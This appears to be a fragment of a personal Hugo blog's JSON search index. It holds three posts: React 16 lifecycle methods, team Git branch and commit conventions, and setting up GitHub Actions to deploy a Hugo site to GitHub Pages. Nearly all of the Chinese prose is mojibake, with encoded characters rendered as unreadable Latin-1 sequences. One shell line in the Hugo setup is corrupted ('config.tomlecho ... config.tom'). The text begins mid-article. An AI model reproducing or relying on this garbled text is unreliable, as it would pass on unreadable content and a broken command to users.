ç»„ä»¶æ¯æ¬¡è¢«re-renderçš„æ—¶å€™ï¼ŒåŒ…æ‹¬åœ¨ç»„ä»¶æ„å»ºä¹‹å(è™šæ‹Ÿdomä¹‹åï¼Œå®é™…domæŒ‚è½½ä¹‹å‰)ï¼Œæ¯æ¬¡è·å–æ–°çš„propsæˆ–stateä¹‹åï¼›æ¯æ¬¡æ¥æ”¶æ–°çš„propsä¹‹åéƒ½ä¼šè¿”å›ä¸€ä¸ªå¯¹è±¡ä½œä¸ºæ–°çš„stateï¼Œè¿”å›nullåˆ™è¯´æ˜ä¸éœ€è¦æ›´æ–°stateï¼›é…åˆcomponentDidUpdateï¼Œå¯ä»¥è¦†ç›–componentWillReceivePropsçš„æ‰€æœ‰ç”¨æ³•\ngetSnapshotBeforeUpdate(prevProps, prevState) è§¦å‘æ—¶é—´: updateå‘ç”Ÿçš„æ—¶å€™ï¼Œåœ¨renderä¹‹åï¼Œåœ¨ç»„ä»¶domæ¸²æŸ“ä¹‹å‰ï¼›è¿”å›ä¸€ä¸ªå€¼ï¼Œä½œä¸ºcomponentDidUpdateçš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼›é…åˆcomponentDidUpdate, å¯ä»¥è¦†ç›–componentWillUpdateçš„æ‰€æœ‰ç”¨æ³•\nMountingï¼ˆåŠ è½½é˜¶æ®µï¼šæ¶‰åŠ4ä¸ªé’©å­å‡½æ•°ï¼‰ constructor() åŠ è½½çš„æ—¶å€™è°ƒç”¨ä¸€æ¬¡ï¼Œå¯ä»¥åˆå§‹åŒ–state static getDerivedStateFromProps(props, state) æ–°çš„ç”Ÿå‘½å‘¨æœŸ render() reactæœ€é‡è¦çš„æ­¥éª¤ï¼Œåˆ›å»ºè™šæ‹Ÿdomï¼Œè¿›è¡Œdiffç®—æ³•ï¼Œæ›´æ–°domæ ‘éƒ½åœ¨æ­¤è¿›è¡Œ componentDidMount() ç»„ä»¶æ¸²æŸ“ä¹‹åè°ƒç”¨ï¼Œåªè°ƒç”¨ä¸€æ¬¡ Note:\nThese methods are considered legacy and you should avoid them in new code: UNSAFE_componentWillMount()\nUpdatingï¼ˆæ›´æ–°é˜¶æ®µï¼šæ¶‰åŠ5ä¸ªé’©å­å‡½æ•°) static getDerivedStateFromProps(props, state) æ–°çš„ç”Ÿå‘½å‘¨æœŸ shouldComponentUpdate(nextProps, nextState) ç»„ä»¶æ¥æ”¶åˆ°æ–°çš„propsæˆ–è€…stateæ—¶è°ƒç”¨ï¼Œreturn trueå°±ä¼šæ›´æ–°domï¼ˆä½¿ç”¨diffç®—æ³•æ›´æ–°ï¼‰ï¼Œreturn falseèƒ½é˜»æ­¢æ›´æ–°ï¼ˆä¸è°ƒç”¨renderï¼‰ render() reactæœ€é‡è¦çš„æ­¥éª¤ï¼Œåˆ›å»ºè™šæ‹Ÿdomï¼Œè¿›è¡Œdiffç®—æ³•ï¼Œæ›´æ–°domæ ‘éƒ½åœ¨æ­¤è¿›è¡Œ getSnapshotBeforeUpdate(prevProps, prevState) æ–°çš„ç”Ÿå‘½å‘¨æœŸ componentDidUpdate() ç»„ä»¶åŠ è½½æ—¶ä¸è°ƒç”¨ï¼Œç»„ä»¶æ›´æ–°å®Œæˆåè°ƒç”¨ Note: These methods are considered legacy and you should avoid them in new code:\nUNSAFE_componentWillUpdate() UNSAFE_componentWillReceiveProps() Unmountingï¼ˆå¸è½½é˜¶æ®µï¼šæ¶‰åŠ1ä¸ªé’©å­å‡½æ•°ï¼‰ componentWillUnmount()\nç»„ä»¶å³å°†å¸è½½å‰è°ƒç”¨ï¼Œåªè°ƒç”¨ä¸€æ¬¡\nError Handling(é”™è¯¯å¤„ç†) static getDerivedStateFromError() componentDidCatch(errorï¼Œinfo) These methods are called when there is an error during rendering, in a lifecycle method, or in the constructor of any child component\nåŸºæœ¬ç”¨æ³• import React, { Component } from \u0026#39;react\u0026#39; export default class ReactComponent16 extends Component { constructor(props) { super(props) // getDefaultPropsï¼šæ¥æ”¶åˆå§‹props // getInitialStateï¼šåˆå§‹åŒ–state } state = { } static getDerivedStateFromProps(props, state) { // ç»„ä»¶æ¯æ¬¡è¢«rerenderçš„æ—¶å€™ï¼ŒåŒ…æ‹¬åœ¨ç»„ä»¶æ„å»ºä¹‹å(è™šæ‹Ÿdomä¹‹åï¼Œå®é™…domæŒ‚è½½ä¹‹å‰)ï¼Œæ¯æ¬¡è·å–æ–°çš„propsæˆ–stateä¹‹åï¼›;æ¯æ¬¡æ¥æ”¶æ–°çš„propsä¹‹åéƒ½ä¼šè¿”å›ä¸€ä¸ªå¯¹è±¡ä½œä¸ºæ–°çš„stateï¼Œè¿”å›nullåˆ™è¯´æ˜ä¸éœ€è¦æ›´æ–°state return state } componentDidCatch(error, info) { // è·å–åˆ°javascripté”™è¯¯ } render() { return ( \u0026lt;h2\u0026gt;New React.Component\u0026lt;/h2\u0026gt; ) } componentDidMount() { // æŒ‚è½½å } shouldComponentUpdate(nextProps, nextState) { // ç»„ä»¶Propsæˆ–è€…stateæ”¹å˜æ—¶è§¦å‘ï¼Œtrueï¼šæ›´æ–°ï¼Œfalseï¼šä¸æ›´æ–° return true } getSnapshotBeforeUpdate(prevProps, prevState) { // ç»„ä»¶æ›´æ–°å‰è§¦å‘ } componentDidUpdate() { // ç»„ä»¶æ›´æ–°åè§¦å‘ } componentWillUnmount() { // ç»„ä»¶å¸è½½æ—¶è§¦å‘ } } æ€»ç»“ æ—§çš„ç”Ÿå‘½å‘¨æœŸ æ–°çš„ç”Ÿå‘½å‘¨æœŸ React16æ–°çš„ç”Ÿå‘½å‘¨æœŸå¼ƒç”¨äº†componentWillMountã€componentWillReceivePropsï¼ŒcomponentWillUpdate æ–°å¢äº†getDerivedStateFromPropsã€getSnapshotBeforeUpdateæ¥ä»£æ›¿å¼ƒç”¨çš„ä¸‰ä¸ªé’©å­å‡½æ•°ï¼ˆcomponentWillMountã€componentWillReceivePropsï¼ŒcomponentWillUpdateï¼‰ React16å¹¶æ²¡æœ‰åˆ é™¤è¿™ä¸‰ä¸ªé’©å­å‡½æ•°ï¼Œä½†æ˜¯ä¸èƒ½å’Œæ–°å¢çš„é’©å­å‡½æ•°ï¼ˆgetDerivedStateFromPropsã€getSnapshotBeforeUpdateï¼‰æ··ç”¨ï¼ŒReact17å°†ä¼šåˆ é™¤componentWillMountã€componentWillReceivePropsï¼ŒcomponentWillUpdate æ–°å¢äº†å¯¹é”™è¯¯çš„å¤„ç†ï¼ˆcomponentDidCatchï¼‰\nå‚è€ƒ react-component æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/frontend-develop/react-lifecycle/","summary":"\u003cp\u003eè¿™æ˜¯ä¸€ç¯‡åŸè®¡åˆ’åœ¨react v16.x å‘å¸ƒçš„æ—¶å€™è¦å†™çš„æ–‡ç« ï¼ŒæŒ‰ç…§è¿™ä¸ªæ—¶é—´èŠ‚ç‚¹ï¼Œè‡³å°‘æ‹–æ¬ äº†ä¸¤å¹´ä¹‹ä¹…\u0026hellip;\u003c/p\u003e","title":"èŠä¸‹reactä¸­ç”Ÿå‘½å‘¨æœŸ"},{"content":"ä¸€ã€èƒŒæ™¯ å›¢é˜Ÿå¼€å‘ä¸­ï¼Œéµå¾ªä¸€ä¸ªåˆç†ã€æ¸…æ™°çš„ Git ä½¿ç”¨æµç¨‹ï¼Œæ˜¯éå¸¸é‡è¦çš„ã€‚ å¦åˆ™ï¼Œå„ç§ä¸æ¸…æ™°çš„åˆ†æ”¯ï¼Œå†åŠ ä¸Šä¸€å †æ‚ä¹±æ— ç« çš„commitï¼Œåœ¨åç»­çš„æŸ¥æ‰¾å®šä½é—®é¢˜å’Œäº§å“è¿­ä»£ç»´æŠ¤ä¼šè®©ä½ çŸ¥é“ä»€ä¹ˆæ˜¯å¤´ç–¼çš„ã€‚\nå¦‚æœé¡¹ç›®ä¸­åªæœ‰ä¸¤ä¸‰ä¸ªäººå¼€å‘ï¼Œå…¶å®ä¹Ÿä¸éœ€è¦ä¸¥æ ¼çš„è§„èŒƒï¼Œåªè¦æŠŠæäº¤å†…å®¹å†™æ¸…æ¥šå°±è¡Œï¼Œä½†æ˜¯å¤§å‹é¡¹ç›®ï¼Œå¼€å‘äººå‘˜è¾ƒå¤šï¼Œè§„èŒƒæäº¤è¿˜æ˜¯æœ‰å¿…è¦çš„\næ‰€ä»¥ï¼Œæˆ‘ä»¬ä¼šä»ä»¥ä¸‹å‡ ä¸ªæ–¹é¢æ¥è®²:\nåˆ†æ”¯å‘½åè§„èŒƒ åˆ†æ”¯ä½¿ç”¨è§„èŒƒ(git-flow) commit è§„èŒƒ äºŒã€åˆ†æ”¯å‘½åè§„èŒƒ (1) master åˆ†æ”¯\nmaster ä¸ºä¸»åˆ†æ”¯ï¼Œç”¨äºéƒ¨ç½²ç”Ÿäº§ç¯å¢ƒï¼Œè¦ç¡®ä¿ç¨³å®šæ€§ master åˆ†æ”¯ä¸€èˆ¬ç”± develop ä»¥åŠ hotfix åˆ†æ”¯åˆå¹¶ï¼Œä»»ä½•æ—¶é—´éƒ½ä¸èƒ½ç›´æ¥ä¿®æ”¹ master åˆ†æ”¯ä»£ç  æ¯æ¬¡æ›´æ–°masterï¼Œéƒ½éœ€å¯¹masteræ·»åŠ æŒ‡å®šæ ¼å¼çš„tag(git tag -a v0.0.1 -m \u0026ldquo;å¡«å†™æè¿°\u0026rdquo;)ï¼Œç”¨äºå‘å¸ƒæˆ–å›æ»š (2) develop åˆ†æ”¯\ndevelop ä¸ºå¼€å‘åˆ†æ”¯ï¼Œå§‹ç»ˆä¿æŒæœ€æ–°å®Œæˆä»¥åŠbugä¿®å¤åçš„ä»£ç  ä¸€èˆ¬å¼€å‘æ–°åŠŸèƒ½æ—¶ï¼Œfeature åˆ†æ”¯éƒ½æ˜¯åŸºäº develop åˆ†æ”¯ä¸‹åˆ›å»ºçš„ (3) feature åˆ†æ”¯\nå¼€å‘æ–°åŠŸèƒ½æ—¶ï¼Œä»¥ develop åˆ†æ”¯ä¸ºåŸºç¡€åˆ›å»º feature åˆ†æ”¯ åˆ†æ”¯å‘½å: feature/ å¼€å¤´çš„ä¸ºç‰¹æ€§åˆ†æ”¯ï¼Œ å‘½åè§„åˆ™: feature/module_userName_date ä¾‹å­ï¼š feature/lowCodeConfigs_yaoLing_20201015\n(4) release åˆ†æ”¯\nrelease ä¸ºé¢„å‘å¸ƒåˆ†æ”¯ï¼Œå‘å¸ƒææµ‹é˜¶æ®µï¼Œä»¥ release åˆ†æ”¯ä»£ç ä¸ºåŸºå‡†ææµ‹ (5) hotfix åˆ†æ”¯\nåˆ†æ”¯å‘½å: hotfix/ å¼€å¤´çš„ä¸ºä¿®å¤åˆ†æ”¯ï¼Œå®ƒçš„å‘½åè§„åˆ™ä¸ feature åˆ†æ”¯ç±»ä¼¼ çº¿ä¸Šå‡ºç°ç´§æ€¥é—®é¢˜æ—¶ï¼Œéœ€è¦åŠæ—¶ä¿®å¤ï¼Œä»¥ master åˆ†æ”¯ä¸ºåŸºçº¿ï¼Œåˆ›å»º hotfix åˆ†æ”¯ï¼Œä¿®å¤å®Œæˆåï¼Œéœ€è¦åˆå¹¶åˆ° master åˆ†æ”¯å’Œ develop åˆ†æ”¯ ä¸‰ã€åˆ†æ”¯ä½¿ç”¨è§„èŒƒ(git-flow) æ–°åŠŸèƒ½å¼€å‘æµç¨‹\nä» develop åˆ†æ”¯åˆ›å»º feature åˆ†æ”¯ å¼€å‘è°ƒè¯•å®Œå°† feature åˆ†æ”¯æäº¤åˆ°è¿œç¨‹ç‰ˆæœ¬åº“ æäº¤ pull request è¯·æ±‚ Merge åˆ° develop åˆ†æ”¯ ç›¸å…³è´Ÿè´£äºº code review åŒæ„åˆå¹¶åï¼Œåˆ é™¤è¿œç¨‹ feature åˆ†æ”¯ ä¸åŒæ„ï¼Œé‡æ–°ä¿®æ”¹åä¸Šä¼  feature åˆ†æ”¯ï¼Œå›åˆ°ç¬¬3æ­¥æ‰§è¡Œ ä¾èµ–developåˆ†æ”¯æ„å»ºæµ‹è¯•ç¯å¢ƒï¼Œè´¨é‡å·¥ç¨‹å¸ˆåŠŸèƒ½æµ‹è¯•éªŒæ”¶ æµ‹è¯•é—®é¢˜ç›´æ¥åœ¨developåˆ†æ”¯ä¿®å¤ æµ‹è¯•ç¯å¢ƒéªŒæ”¶é€šè¿‡ï¼Œä¸”åˆå¹¶developåˆ†æ”¯è‡³releaseåˆ†æ”¯ï¼Œreleaseåˆ†æ”¯å¡«å…¥æœ€è¿‘\u0026quot;æ—¥å¸¸å‘å¸ƒæ—¥\u0026quot;å‘å¸ƒè®¡åˆ’ï¼Œå‘å¸ƒé¢„å‘ç¯å¢ƒï¼Œé‚€è¯·äº§å“å’Œè§†è§‰å›¢é˜ŸéªŒæ”¶ é¢„å‘é—®é¢˜åœ¨æµ‹è¯•åˆ†æ”¯ä¿®å¤ï¼Œä¿®å¤å®Œæˆåè¿”å›ç¬¬5æ­¥ é¢„å‘ç¯å¢ƒéªŒæ”¶é€šè¿‡ï¼Œå‘å¸ƒæ—¥è‡ªåŠ¨æ„å»ºéƒ¨ç½²ï¼Œæ­£å¸¸å‘å¸ƒã€‚é‚€è¯·äº§å“å›¢é˜Ÿç”Ÿäº§éªŒæ”¶ï¼Œç¡®è®¤æ— è¯¯åˆ™åˆå¹¶releaseåˆ†æ”¯åˆ°masteråˆ†æ”¯å’Œdevelopåˆ†æ”¯ ç´§æ€¥é—®é¢˜ä¿®å¤æµç¨‹\nä» master åˆ†æ”¯åˆ›å»º hotfix åˆ†æ”¯ä¸”ç”³è¯·å¡«å†™â€œç´§æ€¥å‘å¸ƒè®¡åˆ’â€ ä¿®å¤å®Œå°† hotfix åˆ†æ”¯æäº¤åˆ°è¿œç¨‹ç‰ˆæœ¬åº“ æäº¤ pull request è¯·æ±‚ Merge åˆ° release åˆ†æ”¯ ç›¸å…³è´Ÿè´£äºº code review åŒæ„åˆå¹¶åï¼Œåˆ é™¤è¿œç¨‹ hotfix åˆ†æ”¯ ä¸åŒæ„ï¼Œé‡æ–°ä¿®æ”¹åä¸Šä¼  hotfix åˆ†æ”¯ï¼Œå›åˆ°ç¬¬3æ­¥æ‰§è¡Œ ä¾èµ– release åˆ†æ”¯æ„é¢„å‘ç¯å¢ƒï¼Œè´¨é‡å·¥ç¨‹å¸ˆåŠŸèƒ½æµ‹è¯•éªŒæ”¶ é—®é¢˜ç›´æ¥åœ¨ release åˆ†æ”¯ä¿®å¤ é¢„å‘ç¯å¢ƒéªŒæ”¶é€šè¿‡ï¼Œå¯åŠ¨ç´§æ€¥å‘å¸ƒè®¡åˆ’è‡ªåŠ¨æ„å»ºéƒ¨ç½²ï¼Œæ­£å¸¸å‘å¸ƒã€‚é‚€è¯·äº§å“å›¢é˜Ÿç”Ÿäº§éªŒæ”¶ï¼Œç¡®è®¤æ— è¯¯åˆ™åˆå¹¶releaseåˆ†æ”¯åˆ°masteråˆ†æ”¯å’Œdevelopåˆ†æ”¯ æ³¨æ„ï¼šå®é™…é¡¹ç›®ä¸­ï¼Œç”±äºéœ€æ±‚çš„å¤æ‚æ€§ï¼Œå¯èƒ½åŒæ—¶å­˜åœ¨å¤šä¸ªæµ‹è¯•åˆ†æ”¯ã€é¢„å‘åˆ†æ”¯\nå››ã€commit è§„èŒƒ ä¸‹é¢ä»£ç çš„ -m å‚æ•°ï¼Œå°±æ˜¯ç”¨æ¥æŒ‡å®š commit message çš„\n$ git commit -m \u0026#34;commit message\u0026#34; ä¸€èˆ¬æ¥è¯´ï¼Œcommit message åº”è¯¥æ¸…æ™°æ˜äº†ï¼Œè¯´æ˜æœ¬æ¬¡æäº¤çš„ç›®çš„ã€‚è€Œä¸”å¤šäººåä½œçš„æ—¶å€™ï¼Œæœ‰é—®é¢˜ä¹Ÿæ–¹ä¾¿æŸ¥çœ‹æäº¤æ—¥å¿—ã€‚\nå¦‚æœä¸€è¡Œä¸å¤Ÿï¼Œå¯ä»¥åªæ‰§è¡Œgit commitï¼Œå°±ä¼šè·³å‡ºæ–‡æœ¬ç¼–è¾‘å™¨ï¼Œè®©ä½ å†™å¤šè¡Œ\nç›®å‰ï¼Œç¤¾åŒºæœ‰å¤šç§ Commit message çš„å†™æ³•è§„èŒƒã€‚æ¥è‡ªAngular è§„èŒƒæ˜¯ç›®å‰ä½¿ç”¨æœ€å¹¿çš„å†™æ³•ï¼Œæ¯”è¾ƒåˆç†å’Œç³»ç»ŸåŒ–\nå‚è€ƒ angular/angular.js commits è®°å½•ã€‚\nCommit message åŒ…æ‹¬ä¸‰ä¸ªéƒ¨åˆ†ï¼šHeaderã€Body å’Œ Footer\n\u0026lt;type\u0026gt;(\u0026lt;scope\u0026gt;): \u0026lt;subject\u0026gt; // ç©ºä¸€è¡Œ \u0026lt;body\u0026gt; // ç©ºä¸€è¡Œ \u0026lt;footer\u0026gt; å…¶ä¸­ï¼ŒHeader æ˜¯å¿…éœ€çš„ï¼ŒBody å’Œ Footer å¯ä»¥çœç•¥ã€‚ä¸ºäº†é¿å…è‡ªåŠ¨æ¢è¡Œå½±å“ç¾è§‚ï¼Œæ¯éƒ¨åˆ†ï¼Œä»»ä½•ä¸€è¡Œéƒ½ä¸è¦æœ‰å¤ªå¤šå­—ç¬¦\n1ã€Head\nHeaderéƒ¨åˆ†åªæœ‰ä¸€è¡Œï¼ŒåŒ…æ‹¬ä¸‰ä¸ªå­—æ®µï¼štypeï¼ˆå¿…å¡«ï¼‰ã€scopeï¼ˆå½±å“èŒƒå›´ï¼Œé€‰å¡«ï¼‰å’Œsubjectï¼ˆå¿…å¡«ï¼‰\ntypeï¼Œå¿…é€‰\ncommit çš„ç±»åˆ«ï¼Œåªå…è®¸ä½¿ç”¨ä»¥ä¸‹æ ‡è¯†ï¼ˆæˆ–ç”¨å¯¹åº”çš„ emoji è¡¨æƒ…ï¼Œåœ¨å‰è¾¹å†åŠ ä¸€ä¸ª: å°±ä¼šæ˜¾ç¤ºäº†ï¼‰\nfeatï¼šæ–°å¢åŠŸèƒ½ï¼ˆâœ¨ï¼‰ fixï¼šä¿®è¡¥bugï¼ˆ ğŸš‘ï¼‰ docsï¼šä¿®æ”¹æ–‡æ¡£ï¼ˆğŸ“šï¼‰ styleï¼š æ ¼å¼åŒ–ä»£ç ç»“æ„ï¼Œæ— é€»è¾‘ä¸Šçš„ä»£ç ä¿®æ”¹ï¼ˆğŸ¨) refactorï¼šé‡æ„ï¼Œå³ä¸æ˜¯æ–°å¢åŠŸèƒ½ï¼Œä¹Ÿä¸æ˜¯ä¿®æ”¹bugçš„ä»£ç å˜åŠ¨ï¼Œæ¯”å¦‚é‡å‘½åå˜é‡ï¼ˆğŸšœï¼‰ testï¼šå¢åŠ æµ‹è¯•ä»£ç ï¼Œå•å…ƒæµ‹è¯•ä¸€ç±»çš„ï¼Œæ²¡æœ‰ç”Ÿäº§ä»£ç çš„å˜æ›´ï¼ˆğŸ”¬ï¼‰ choreï¼šæ„å»ºè¿‡ç¨‹æˆ–è¾…åŠ©å·¥å…·çš„å˜åŠ¨ï¼ˆä¸ä¼šå½±å“ä»£ç è¿è¡Œï¼‰ revertï¼šå›æ»šåˆ°ä¸Šä¸€ä¸ªç‰ˆæœ¬ã€‚ mergeï¼šä»£ç åˆå¹¶ã€‚ syncï¼šåŒæ­¥ä¸»çº¿æˆ–åˆ†æ”¯çš„Bug ç‰¹æ®Šæƒ…å†µï¼Œå½“å‰ commit ç”¨äºæ’¤é”€ä»¥å‰çš„ commitï¼Œåˆ™å¿…é¡»ä»¥revert:å¼€å¤´ï¼Œåé¢è·Ÿç€è¢«æ’¤é”€ Commit çš„ Header\nrevert: feat: è®¾è®¡å™¨ Configs åŸºç¡€é…ç½® This reverts commit 660ecc1654a317a13331b17617d973392f418f02 æ¨èä¸€ä¸ªç¼–å†™ Commit message çš„å·¥å…· Commitizen\nscope: å¯é€‰ã€‚ç”¨äºå®šä¹‰ type å½±å“çš„èŒƒå›´ï¼Œæ¯”å¦‚æ•°æ®å±‚ã€æ§åˆ¶å±‚ã€è§†å›¾å±‚ç­‰ç­‰ï¼Œè§†é¡¹ç›®ä¸åŒè€Œä¸åŒ\nsubject: å¿…é€‰ã€‚commitç›®çš„çš„ç®€çŸ­æè¿°ï¼Œä¸è¶…è¿‡50ä¸ªå­—ç¬¦\n2ã€Body\nBody éƒ¨åˆ†æ˜¯å¯¹æœ¬æ¬¡ commit çš„è¯¦ç»†æè¿°ï¼Œå¯ä»¥åˆ†æˆå¤šè¡Œï¼Œæ¯è¡Œå°½é‡ä¸è¶…è¿‡72ä¸ªå­—ç¬¦\n3ã€Footer\nFooter éƒ¨åˆ†åªç”¨äºä¸¤ç§æƒ…å†µ:\nä¸å…¼å®¹å˜åŠ¨: å¦‚æœå½“å‰ä»£ç ä¸ä¸Šä¸€ä¸ªç‰ˆæœ¬ä¸å…¼å®¹ï¼Œåˆ™ Footer éƒ¨åˆ†ä»¥BREAKING CHANGEå¼€å¤´ï¼Œåé¢æ˜¯å¯¹å˜åŠ¨çš„æè¿°ã€ä»¥åŠå˜åŠ¨ç†ç”±å’Œè¿ç§»æ–¹æ³• å…³é—­ Issueï¼šå¦‚æœå½“å‰ commit é’ˆå¯¹æŸä¸ªissueï¼Œé‚£ä¹ˆå¯ä»¥åœ¨ Footer éƒ¨åˆ†å…³é—­è¿™ä¸ª issue Closes #234 Closes #123, #245, #992 ç¤ºä¾‹\nfeat: è®¾è®¡å™¨ Configs åŸºç¡€é…ç½® fix: ä¿®å¤Container Pageç‰¹æ®Šå±æ€§è”åŠ¨åˆ‡æ¢é—®é¢˜ style: delete å†—ä½™è”è°ƒé˜¶æ®µdebugger docs: æ›´æ–°apiæ–‡æ¡£ chore: å‡çº§ monaco-editor åŠå¯¹åº”babel æ’ä»¶åŒ…ç‰ˆæœ¬ refactor: é‡æ„Configs æ–¹æ¡ˆï¼ˆé¢„è®¾-\u0026gt;åŠ¨æ€æ‹“å±•ï¼‰ å‚è€ƒ å¦‚ä½•è§„èŒƒä½ çš„Git commit.é˜¿é‡ŒæŠ€æœ¯ æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\n","permalink":"https://lianpf.github.io/posts/other/git-teamusage-standards/","summary":"ä¸€ã€èƒŒæ™¯ å›¢é˜Ÿå¼€å‘ä¸­ï¼Œéµå¾ªä¸€ä¸ªåˆç†ã€æ¸…æ™°çš„ Git ä½¿ç”¨æµç¨‹ï¼Œæ˜¯éå¸¸é‡","title":"Git: å›¢é˜Ÿåˆ†æ”¯å‘½åä½¿ç”¨å’ŒCommitæäº¤è§„èŒƒ"},{"content":"ä¸€ã€æ•´ä¸ªæµç¨‹åŠåŸç† 1.ç‰©æ–™ xxx.github.io public ä»“åº“ A å­˜æ”¾ä¸ªäººæºç (åšå®¢æ–‡ç¨¿) çš„ private ä»“åº“ B ç†Ÿæ‚‰ Hugo ç†Ÿæ‚‰ github actions æ³¨æ„ï¼šå›½å†…ç«™ç‚¹å¯ä»¥å‚è€ƒGitee\n2.æµç¨‹åŠåŸç† æœ¬åœ°æ·»åŠ æ–‡ç« ï¼Œæäº¤åˆ° Github ä»“åº“ B push æ“ä½œè‡ªåŠ¨è§¦å‘ Github ä»“åº“ B é¢„å…ˆé…ç½®çš„Actions æ‰§è¡Œå¯¹åº”çš„actionï¼Œæ„å»ºæ‰“åŒ…ï¼Œä¸”å‘å¸ƒæ‰“åŒ…åçš„æºç åˆ°ä»“åº“ A æ‰˜ç®¡ é€šè¿‡ Github ç»™ Pages ç”Ÿæˆçš„ URL è®¿é—®å³å¯ äºŒã€è¯¦ç»†æ­¥éª¤ 1.åˆ›å»ºä»“åº“ä¸”é…ç½®SSH Key åˆ›å»º xxx.github.io ä»“åº“ åˆ›å»ºå­˜æ”¾æºç ä»“åº“ Blogsï¼ˆæ ¹æ®ä¸ªäººéœ€æ±‚å¯è®¾ç½®ä¸ºprivateï¼‰ ç”Ÿæˆä¸€å¯¹SSH Keyï¼Œä¸ºä¸¤ä¸ªä»“åº“ç»‘å®š SSH Key ä¸ºä»€ä¹ˆéœ€è¦SSH Keyï¼Ÿ\nå½“æˆ‘ä»¬åœ¨é€šè¿‡Gitæäº¤æºç ä¹‹åï¼ŒGithub Actionsä¼šç¼–è¯‘ç”Ÿæˆé™æ€æ–‡ä»¶å¹¶é€šè¿‡Git Pushåˆ° xxx.github.ioï¼Œå› æ­¤è¿™ä¸€æ­¥éœ€è¦ Git è´¦æˆ·è®¤è¯ã€‚\nå¦‚ä½•é…ç½®ï¼Ÿ\nç”Ÿæˆçš„ Public Key æ·»åŠ åˆ° xxx.github.io ä»“åº“ï¼Œsettings -\u0026gt; Deploy keysï¼Œå˜é‡åæ— æ‰€è°“ã€‚ Private Key æ·»åŠ åˆ° æºç ä»“åº“ Blogsï¼Œsettings -\u0026gt; Secretsã€‚è¿™é‡Œ Secrets å˜é‡åè¦ä¸€å®šæ˜¯ï¼š ACTIONS_DEPLOY_KEY, ä¼šåœ¨æºç ä»“åº“hugo action .ymlæ–‡ä»¶è‡ªåŠ¨åŒ–æ„å»ºéƒ¨ç½²ç”¨åˆ°ã€‚ 2.å¯ç”¨ Hugo 2.1 å°† xxx.github.io.source ä»“åº“å…‹éš†åˆ°æœ¬åœ°ï¼Œåˆå§‹åŒ– Hugo ç³»ç»Ÿ # é€‰å–ä¸€ä¸ªç›®å½• # å…‹éš† source ä»“åº“ git clone xxx # è¿›å…¥ä»“åº“ cd xxx.github.io ç”Ÿæˆ Hugo æºç å¹¶è¿›è¡Œé…ç½®\n# åœ¨å½“å‰ç›®å½•ç”Ÿæˆ Hugo æºç  hugo new site . # ä¸ºå½“å‰åšå®¢é€‰å–ä¸€ä¸ªä¸»é¢˜ï¼Œä½ å¯ä»¥ä¸æ‰§è¡Œè¿™ä¸€å‘½ä»¤ä½¿ç”¨é»˜è®¤çš„ä¸»é¢˜ git submodule add https://github.com/halogenica/beautifulhugo.git themes/beautifulhugo # ç¼–è¾‘ config.toml é…ç½®æ–‡ä»¶ï¼Œä½¿ beautifulhugo ä¸»é¢˜ç”Ÿæ•ˆ echo \u0026#39;theme = \u0026#34;beautifulhugo\u0026#34;\u0026#39; \u0026gt;\u0026gt; config.tomlecho \u0026#39;theme = \u0026#34;beautifulhugo\u0026#34;\u0026#39; \u0026gt;\u0026gt; config.tom # æ­¤æ—¶ä½ å°±å¯ä»¥è¿è¡Œé¢„è§ˆæ•ˆæœ hugo serve -D æ­¤æ—¶ï¼Œæ§åˆ¶å°æ„å»ºæˆåŠŸ,è¾“å‡ºå¯è®¿é—®åœ°å€ï¼š\nhttp://localhost:1313/ æ»¡æ„æ²¡é—®é¢˜ä¹‹åï¼Œå³å¯æ¨é€åˆ° Github\ngit add . git commit -m \u0026#34;first commit\u0026#34; git push -u origin master 3.é…ç½® Github è‡ªåŠ¨æ„å»ºå‘å¸ƒ Actions æºç ä»“åº“Blogsä¸º xxx.github.io ä»“åº“é…ç½®actionã€‚å¯ç›´æ¥æ‹·è´å¦‚ä¸‹ä»£ç ï¼š\nname: GitHubPages on: push: branches: - master # Set a branch to deploy jobs: deploy: runs-on: ubuntu-20.04 # ubuntu-18.04 å·²åºŸå¼ƒï¼Œæ³¨æ„å› ubuntuç‰ˆæœ¬é—®é¢˜å¯¼è‡´deployå¯åŠ¨å¤±è´¥ steps: - uses: actions/checkout@v2 with: submodules: recursive # Fetch Hugo themes (true OR recursive) fetch-depth: 0 # Fetch all history for .GitInfo and .Lastmod - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: # hugo-version: \u0026#39;${{ steps.hugo-version.outputs.HUGO_VERSION }}\u0026#39; hugo-version: \u0026#39;0.74.2\u0026#39; # extended: true - name: Build run: hugo --minify - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: deploy_key: ${{ secrets.ACTIONS_DEPLOY_KEY }} external_repository: xxx/xxx.github.io publish_branch: master publish_dir: ./public ä¿®æ”¹è¿œç¨‹ä»“åº“å³å¯ï¼Œå…¶ä»–çš„åŸºæœ¬ä¸Šä¸ç”¨æ›´æ–°ã€‚\n4.éªŒè¯ æœ¬åœ°ä¿®æ”¹æºç , commitã€pushï¼Œæ£€æŸ¥æµæ°´çº¿æ˜¯è¢«æ­£å¸¸è§¦å‘ï¼Œå¯ä»¥æŸ¥çœ‹æµæ°´çº¿æ—¥å¿—ç¡®è®¤ã€‚\næ•´ä¸ªæ­å»ºå°±ç»“æŸäº†ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®Githubä¸º xxx/xxx.github.io ä»“åº“ç”Ÿæˆçš„åŸŸåï¼šhttps://xxx.github.io/ 